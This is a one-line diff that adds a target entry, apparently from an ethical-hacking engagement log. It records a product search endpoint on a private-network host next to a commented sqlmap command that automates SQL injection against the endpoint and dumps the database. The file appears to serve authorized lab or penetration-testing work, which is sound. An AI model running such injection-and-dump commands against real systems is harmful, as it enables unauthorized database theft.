@@ -1,0 +1,1 @@
+http://10.3.10.10:1234/rest/products/search?q=test (GET)  # /opt/homebrew/bin/sqlmap -u http://10.3.10.10:1234/rest/products/search?q=test --batch --level=3 --risk=2 --threads=4 --dbms=sqlite --output-dir=/Users/bingus/repos/EH_Skills/engagements/10-3-10-10-1234/scans/sqlmap --dump
